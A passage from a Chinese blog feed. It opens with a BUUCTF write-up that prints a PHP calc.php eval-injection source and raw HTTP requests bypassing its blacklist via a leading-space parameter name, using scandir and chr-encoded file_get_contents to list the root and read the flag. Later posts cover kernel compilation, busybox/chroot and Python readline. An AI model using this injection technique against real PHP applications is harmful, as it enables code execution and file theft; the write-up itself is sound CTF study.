class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;node3.buuoj.cn:28482&#x2F;calc.php</span><br><span class="line">源码如下：</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!isset($_GET[&#39;num&#39;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">        $str &#x3D; $_GET[&#39;num&#39;];</span><br><span class="line">        $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;];</span><br><span class="line">        foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">                if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $str)) &#123;</span><br><span class="line">                        die(&quot;what are you want to do?&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        eval(&#39;echo &#39;.$str.&#39;;&#39;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="发现对num进行了check，但是只是num做了check，所以我们可以特殊字符对num做一定的处理使得-str取不到num">发现对num进行了check，但是只是num做了check，所以我们可以特殊字符对num做一定的处理使得$str取不到num</h3><h3 id="知道漏洞后，我们先输出一下目录，来看看根目录有没有flag">知道漏洞后，我们先输出一下目录，来看看根目录有没有flag</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;calc.php?%20num&#x3D;1;var_dump(scandir(chr(47))); HTTP&#x2F;1.1</span><br><span class="line">Host: node3.buuoj.cn:28482</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:73.0) Gecko&#x2F;20100101 Firefox&#x2F;73.0</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;node3.buuoj.cn:28482&#x2F;</span><br><span class="line"></span><br><span class="line">接收到的数据如下</span><br><span class="line"></span><br><span class="line">Content-Length: 674</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;UTF-8</span><br><span class="line"></span><br><span class="line">1array(24) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(1) &quot;.&quot;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;..&quot;</span><br><span class="line">  [2]&#x3D;&gt;</span><br><span class="line">  string(10) &quot;.dockerenv&quot;</span><br><span class="line">  [3]&#x3D;&gt;</span><br><span class="line">  string(3) &quot;bin&quot;</span><br><span class="line">  [4]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;boot&quot;</span><br><span class="line">  [5]&#x3D;&gt;</span><br><span class="line">  string(3) &quot;dev&quot;</span><br><span class="line">  [6]&#x3D;&gt;</span><br><span class="line">  string(3) &quot;etc&quot;</span><br><span class="line">  [7]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;f1agg&quot;</span><br><span class="line">  [8]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;home&quot;</span><br><span class="line">  [9]&#x3D;&gt;</span><br><span class="line">  string(3) &quot;lib&quot;</span><br><span class="line">  [10]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;lib64&quot;</span><br><span class="line">  [11]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;media&quot;</span><br><span class="line">  [12]&#x3D;&gt;</span><br><span class="line">  string(3) &quot;mnt&quot;</span><br><span class="line">  [13]&#x3D;&gt;</span><br><span class="line">  string(3) &quot;opt&quot;</span><br><span class="line">  [14]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;proc&quot;</span><br><span class="line">  [15]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;root&quot;</span><br><span class="line">  [16]&#x3D;&gt;</span><br><span class="line">  string(3) &quot;run&quot;</span><br><span class="line">  [17]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;sbin&quot;</span><br><span class="line">  [18]&#x3D;&gt;</span><br><span class="line">  string(3) &quot;srv&quot;</span><br><span class="line">  [19]&#x3D;&gt;</span><br><span class="line">  string(8) &quot;start.sh&quot;</span><br><span class="line">  [20]&#x3D;&gt;</span><br><span class="line">  string(3) &quot;sys&quot;</span><br><span class="line">  [21]&#x3D;&gt;</span><br><span class="line">  string(3) &quot;tmp&quot;</span><br><span class="line">  [22]&#x3D;&gt;</span><br><span class="line">  string(3) &quot;usr&quot;</span><br><span class="line">  [23]&#x3D;&gt;</span><br><span class="line">  string(3) &quot;var&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="接着就可以使用file-get-content配合chr和var-dump来输出flag">接着就可以使用file_get_content配合chr和var_dump来输出flag</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;calc.php?%20num&#x3D;1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))); HTTP&#x2F;1.1</span><br><span class="line">Host: node3.buuoj.cn:28482</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:73.0) Gecko&#x2F;20100101 Firefox&#x2F;73.0</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;node3.buuoj.cn:28482&#x2F;</span><br><span class="line"></span><br><span class="line">接收到以下数据</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Date: Fri, 06 Mar 2020 18:23:09 GMT</span><br><span class="line">Server: Apache&#x2F;2.4.18 (Ubuntu)</span><br><span class="line">Content-Length: 58</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;UTF-8</span><br><span class="line">1string(43) &quot;flag&#123;500c2d32-9e01-4df2-abcb-7a192609e016&#125;&quot;</span><br></pre></td></tr></table></figure><h3 id="感谢羽师傅的博客http-www-cl4y-top-buuctf-wp-toc-head-17">感谢羽师傅的博客<a href="http://www.cl4y.top/buuctf_wp/#toc-head-17" target="_blank" rel="noopener">http://www.cl4y.top/buuctf_wp/#toc-head-17</a></h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-护网杯-2018-easy-tornado&quot;&gt;0x01 [护网杯 2018]easy_tornado&lt;/h2&gt;
&lt;h3 id=&quot;打开之后发现三个连接，都点一下，然后发现flag在-fllllllllllllag的位置&quot;&gt;打开之后发现三个连接，都点一下，然
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Linux-进程通信分析</title>
    <link href="http://yoursite.com/2020/02/28/Linux-%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2020/02/28/Linux-%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1%E5%88%86%E6%9E%90/</id>
    <published>2020-02-28T08:05:02.000Z</published>
    <updated>2020-02-29T07:05:42.162Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
      <category term="Linux" scheme="http://yoursite.com/categories/Linux/"/>
    
    
      <category term="Linux" scheme="http://yoursite.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Linux-内核编译</title>
    <link href="http://yoursite.com/2020/02/26/Linux-%E5%86%85%E6%A0%B8%E7%BC%96%E8%AF%91/"/>
    <id>http://yoursite.com/2020/02/26/Linux-%E5%86%85%E6%A0%B8%E7%BC%96%E8%AF%91/</id>
    <published>2020-02-26T13:04:02.000Z</published>
    <updated>2020-02-28T06:09:41.928Z</updated>
    
    <content type="html"><![CDATA[<h1>Linux-内核编译</h1><h2 id="一、下载源码">一、下载源码</h2><h3 id="执行以下命令下载kernel源码">执行以下命令下载kernel源码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;cdn.kernel.org&#x2F;pub&#x2F;linux&#x2F;kernel&#x2F;v5.x&#x2F;linux-5.5.6.tar.xz</span><br></pre></td></tr></table></figure><h3 id="然后解压压缩包，接着cd到kernel目录中">然后解压压缩包，接着cd到kernel目录中</h3><h2 id="二、编译配置环境">二、编译配置环境</h2><h3 id="编译kernel需要很多库，所以请执行以下命令安装库">编译kernel需要很多库，所以请执行以下命令安装库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libncurses* build-essential openssl zlibc minizip libidn11-dev libidn11 libssl-dev flex ncurses-devel libncurses5-dev</span><br></pre></td></tr></table></figure><h2 id="三、Kernel编译配置">三、Kernel编译配置</h2><h3 id="接下来开始配置kernel编译参数">接下来开始配置kernel编译参数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make menuconfig</span><br></pre></td></tr></table></figure><h3 id="配置好了-保存为-config即可">配置好了,保存为.config即可</h3><h2 id="四、开始编译">四、开始编译</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">make</span><br><span class="line">如果想要编译的更快可以用以下指令</span><br><span class="line">make -j8</span><br></pre></td></tr></table></figure><h2 id="五、制作启动程序和文件系统">五、制作启动程序和文件系统</h2><h3 id="将下面的c代码静态编译，如果不静态编译的话，由于我们的文件系统中没有lib环境会导致程序没有对应的ld和libc无法启动。">将下面的c代码静态编译，如果不静态编译的话，由于我们的文件系统中没有lib环境会导致程序没有对应的ld和libc无法启动。</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">void init()&#123;</span><br><span class="line">setbuf(stdin,0);</span><br><span class="line">setbuf(stdout,0);</span><br><span class="line">setbuf(stderr,0);</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">init();</span><br><span class="line">printf(&quot;Hello World(Kernel init)&quot;);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="制作rootfs">制作rootfs</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo c程序的名字 | cpio -o --format&#x3D;newc &gt; rootfs</span><br></pre></td></tr></table></figure><h3 id="编译好了之后进入arch目录在x86-64文件夹内找到bzImage，将其单独取出来，然后放到自己的目录里，接下来开始启动kernel">编译好了之后进入arch目录在x86_64文件夹内找到bzImage，将其单独取出来，然后放到自己的目录里，接下来开始启动kernel</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64   \</span><br><span class="line">        -kernel .&#x2F;bzImage_x86_64 \</span><br><span class="line">        -initrd .&#x2F;rootfs  \</span><br><span class="line">        -append &quot;root&#x3D;&#x2F;dev&#x2F;ram rdinit&#x3D;&#x2F;c程序的名字 console&#x3D;ttyS0&quot;   \</span><br><span class="line">        -nographic</span><br></pre></td></tr></table></figure><h3 id="当然为了方便起见，可以将上述代码写入到shell脚本中，便于下次的启动。">当然为了方便起见，可以将上述代码写入到shell脚本中，便于下次的启动。</h3><h3 id="运行之后你会在log中发现输出Hello-World-Kernel-init">运行之后你会在log中发现输出Hello World(Kernel init)</h3><h2 id="拓展指令">拓展指令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;xxxx&#x2F;linux-4.18.8&#x2F;&#x2F;切换到你解压源码的文件夹</span><br><span class="line">make mrproper &#x2F;&#x2F;清除编译过程中产生的所有中间文件</span><br><span class="line">make clean  &#x2F;&#x2F;清除上一次产生的编译中间文件</span><br><span class="line">make menuconfig&#x2F;&#x2F;图形化界面，方便选择一些功能</span><br></pre></td></tr></table></figure><h2 id="本文章可能存在出现的问题">[本文章可能存在出现的问题]</h2><h4 id="make-menuconfig可能出现的问题">make menuconfig可能出现的问题</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">Q1: 3.14.38内核</span><br><span class="line">root@simon-virtual-machine:&#x2F;home&#x2F;simon&#x2F;FeiLing&#x2F;src&#x2F;linux-3.14.38# make menuconfig</span><br><span class="line">*** Unable to find the ncurses libraries or the</span><br><span class="line">*** required header files.</span><br><span class="line">*** &#39;make menuconfig&#39; requires the ncurses libraries.</span><br><span class="line">*** </span><br><span class="line">*** Install ncurses (ncurses-devel) and try again.</span><br><span class="line">*** </span><br><span class="line">&#x2F;home&#x2F;simon&#x2F;FeiLing&#x2F;src&#x2F;linux-3.14.38&#x2F;scripts&#x2F;kconfig&#x2F;Makefile:199: recipe for target &#39;scripts&#x2F;kconfig&#x2F;dochecklxdialog&#39; failed</span><br><span class="line">make[1]: *** [scripts&#x2F;kconfig&#x2F;dochecklxdialog] Error 1</span><br><span class="line">Makefile:512: recipe for target &#39;menuconfig&#39; failed</span><br><span class="line">make: *** [menuconfig] Error 2</span><br><span class="line"></span><br><span class="line">A1: sudo apt-get install ncurses-devel</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">Q2: 4.17.2内核</span><br><span class="line">root@simon-virtual-machine:&#x2F;home&#x2F;simon&#x2F;Src&#x2F;linux-4.17.2# make menuconfig</span><br><span class="line">YACC scripts&#x2F;kconfig&#x2F;zconf.tab.c</span><br><span class="line">&#x2F;bin&#x2F;sh: 1: bison: not found</span><br><span class="line">scripts&#x2F;Makefile.lib:196: recipe for target &#39;scripts&#x2F;kconfig&#x2F;zconf.tab.c&#39; failed</span><br><span class="line">make[1]: *** [scripts&#x2F;kconfig&#x2F;zconf.tab.c] Error 127</span><br><span class="line">Makefile:528: recipe for target &#39;menuconfig&#39; failed</span><br><span class="line">make: *** [menuconfig] Error 2</span><br><span class="line"></span><br><span class="line">A2：apt-get install bison -y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Q3:</span><br><span class="line">root@simon-virtual-machine:&#x2F;home&#x2F;simon&#x2F;Src&#x2F;linux-4.17.2# make menuconfig</span><br><span class="line">YACC scripts&#x2F;kconfig&#x2F;zconf.tab.c</span><br><span class="line">LEX scripts&#x2F;kconfig&#x2F;zconf.lex.c</span><br><span class="line">&#x2F;bin&#x2F;sh: 1: flex: not found</span><br><span class="line">scripts&#x2F;Makefile.lib:188: recipe for target &#39;scripts&#x2F;kconfig&#x2F;zconf.lex.c&#39; failed</span><br><span class="line">make[1]: *** [scripts&#x2F;kconfig&#x2F;zconf.lex.c] Error 127</span><br><span class="line">Makefile:528: recipe for target</span><br><span class="line"></span><br><span class="line">A3: sudo apt-get install flex</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Q4: 5.5.6内核</span><br><span class="line">root@ubuntu:&#x2F;home&#x2F;robye&#x2F;Kernel&#x2F;linux-5.5.6# make menuconfig</span><br><span class="line">*</span><br><span class="line">* Unable to find the ncurses package.</span><br><span class="line">* Install ncurses (ncurses-devel or libncurses-dev</span><br><span class="line">* depending on your distribution).</span><br><span class="line">*</span><br><span class="line">* You may also need to install pkg-config to find the</span><br><span class="line">* ncurses installed in a non-default location.</span><br><span class="line">*</span><br><span class="line">scripts&#x2F;kconfig&#x2F;Makefile:212: recipe for target &#39;scripts&#x2F;kconfig&#x2F;mconf-cfg&#39; failed</span><br><span class="line">make[1]: *** [scripts&#x2F;kconfig&#x2F;mconf-cfg] Error 1</span><br><span class="line">Makefile:568: recipe for target &#39;menuconfig&#39; failed</span><br><span class="line">make: *** [menuconfig] Error 2</span><br><span class="line"></span><br><span class="line">A4: sudo apt-get install libncurses5-dev</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;Linux-内核编译&lt;/h1&gt;
&lt;h2 id=&quot;一、下载源码&quot;&gt;一、下载源码&lt;/h2&gt;
&lt;h3 id=&quot;执行以下命令下载kernel源码&quot;&gt;执行以下命令下载kernel源码&lt;/h3&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;
      
    
    </summary>
    
    
      <category term="Linux" scheme="http://yoursite.com/categories/Linux/"/>
    
    
      <category term="Linux" scheme="http://yoursite.com/tags/Linux/"/>
    
      <category term="Kernel" scheme="http://yoursite.com/tags/Kernel/"/>
    
  </entry>
  
  <entry>
    <title>Linux-busybox和chroot的详解</title>
    <link href="http://yoursite.com/2020/02/20/Linux-busybox%E5%92%8Cchroot%E7%9A%84%E8%AF%A6%E8%A7%A3/"/>
    <id>http://yoursite.com/2020/02/20/Linux-busybox%E5%92%8Cchroot%E7%9A%84%E8%AF%A6%E8%A7%A3/</id>
    <published>2020-02-19T16:12:02.000Z</published>
    <updated>2020-02-20T07:16:44.529Z</updated>
    
    <content type="html"><![CDATA[<h1>Linux-busybox和chroot的详解</h1><hr><h2 id="Busybox">Busybox</h2><h3 id="先去busybox官网下载源码-https-busybox-net-downloads">先去busybox官网下载源码 <a href="https://busybox.net/downloads/" target="_blank" rel="noopener">https://busybox.net/downloads/</a></h3><h3 id="比如我选择-busybox-1-31-1-tar-bz2">比如我选择 busybox-1.31.1.tar.bz2</h3><h3 id="在ubuntu中解压，然后cd到这个目录，并输入以下指令">在ubuntu中解压，然后cd到这个目录，并输入以下指令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make defconfig</span><br></pre></td></tr></table></figure><h3 id="然后动态链接编译busybox">然后动态链接编译busybox</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></figure><h3 id="或者静态编译busybox">或者静态编译busybox</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make SHARED&#x3D;0 CC&#x3D;&#39;gcc -static&#39; #静态编译busybox</span><br></pre></td></tr></table></figure><h2 id="chroot使用方法">chroot使用方法</h2><h3 id="常规的用法">常规的用法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chroot 根目录</span><br></pre></td></tr></table></figure><h3 id="chroot配合busybox来使用">chroot配合busybox来使用</h3><h3 id="将上述静态编译的busybox放到根目录里，然后执行下面的命令">将上述静态编译的busybox放到根目录里，然后执行下面的命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chroot 根目录 busybox目录 sh</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;Linux-busybox和chroot的详解&lt;/h1&gt;
&lt;hr&gt;
&lt;h2 id=&quot;Busybox&quot;&gt;Busybox&lt;/h2&gt;
&lt;h3 id=&quot;先去busybox官网下载源码-https-busybox-net-downloads&quot;&gt;先去busybox官网下载源码 &lt;a 
      
    
    </summary>
    
    
      <category term="Linux" scheme="http://yoursite.com/categories/Linux/"/>
    
    
      <category term="Linux" scheme="http://yoursite.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Linux-libc-2.29_ptmalloc_分析</title>
    <link href="http://yoursite.com/2020/02/18/Linux-libc-2.29_ptmalloc_%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2020/02/18/Linux-libc-2.29_ptmalloc_%E5%88%86%E6%9E%90/</id>
    <published>2020-02-17T16:12:02.000Z</published>
    <updated>2020-03-26T03:20:50.413Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个密码看着不太对, 请再试试."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="该文章被加密了，请联系管理员请求密码。" /><label>该文章被加密了，请联系管理员请求密码。</label><button class="hbe-button" onclick="fireKeyEvent(document.getElementById('hexo-blog-encrypt'),'keydown',13);">解密文章</button><div class="bottom-line"></div></div><script>function fireKeyEvent(el, evtType, keyCode){var doc = el.ownerDocument,win = doc.defaultView || doc.parentWindow,evtObj;if(doc.createEvent){if(win.KeyEvent) {evtObj = doc.createEvent('KeyEvents');evtObj.initKeyEvent( evtType, true, true, win, false, false, false, false, keyCode, 0 );}else {evtObj = doc.createEvent('UIEvents');Object.defineProperty(evtObj, 'keyCode', {get : function() { return this.keyCodeVal; }}); Object.defineProperty(evtObj, 'which', {get : function() { return this.keyCodeVal; }});evtObj.initUIEvent( evtType, true, true, win, 1 );evtObj.keyCodeVal = keyCode;if (evtObj.keyCode !== keyCode) {console.log("keyCode " + evtObj.keyCode + " 和 (" + evtObj.which + ") 不匹配");}}el.dispatchEvent(evtObj);} else if(doc.createEventObject){evtObj = doc.createEventObject();evtObj.keyCode = keyCode;el.fireEvent('on' + evtType, evtObj);}}</script><script id="hbeData" type="hbeData" data-hmacdigest="15f1558c839058cff2ed39dff8637fe362aa597f8fb24003fec1453a9814888a"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      该文章被加密了，请联系管理员请求密码。
    
    </summary>
    
    
      <category term="Linux" scheme="http://yoursite.com/categories/Linux/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="Pwn" scheme="http://yoursite.com/tags/Pwn/"/>
    
      <category term="Linux" scheme="http://yoursite.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Python-raw_input实现tab补全</title>
    <link href="http://yoursite.com/2020/02/14/Python-raw_input%E5%AE%9E%E7%8E%B0tab%E8%A1%A5%E5%85%A8/"/>
    <id>http://yoursite.com/2020/02/14/Python-raw_input%E5%AE%9E%E7%8E%B0tab%E8%A1%A5%E5%85%A8/</id>
    <published>2020-02-14T13:14:02.000Z</published>
    <updated>2020-03-19T07:53:02.933Z</updated>
    
    <content type="html"><![CDATA[<h1>Python-raw_input实现tab补全</h1><h2 id="如果一个raw-input的功能加上了tab补全功能的话，整体的便捷性会提高很多。所以我特地查了很多资料，最后发现一下代码可以使用我们的需求">如果一个raw_input的功能加上了tab补全功能的话，整体的便捷性会提高很多。所以我特地查了很多资料，最后发现一下代码可以使用我们的需求</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import readline</span><br><span class="line">CMD &#x3D; [&#39;foo1&#39;, &#39;foo2&#39;, &#39;bar1&#39;, &#39;bar2&#39;, &#39;exit&#39;]</span><br><span class="line">def completer(text, state):</span><br><span class="line">    options &#x3D; [cmd for cmd in CMD if cmd.startswith(text)]</span><br><span class="line">    if state &lt; len(options):</span><br><span class="line">        return options[state]</span><br><span class="line">    else:</span><br><span class="line">        return None</span><br><span class="line"></span><br><span class="line">readline.parse_and_bind(&quot;tab: complete&quot;)</span><br><span class="line">readline.set_completer(completer)</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    cmd &#x3D; raw_input(&#39;&#x3D;&#x3D;&gt; &#39;)</span><br><span class="line">    if cmd&#x3D;&#x3D;&#39;exit&#39;:</span><br><span class="line">        break</span><br><span class="line">    print(cmd)</span><br></pre></td></tr></table></figure><h3 id="首先我们需要查看一下readline模块的功能">首先我们需要查看一下readline模块的功能</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"># readline模块定义了以下方法：</span><br><span class="line">        readline.parse_and_bind(string)： # 解析并执行命令行初始化文件。</span><br><span class="line">        readline.get_line_buffer(): # 返回当前命令行缓存的内容。</span><br><span class="line">        readline.insert_text(string)： # 插入到当前行。</span><br><span class="line">        readline.read_init_file([filename])： # 解析一个命令行初始化文件。</span><br><span class="line">        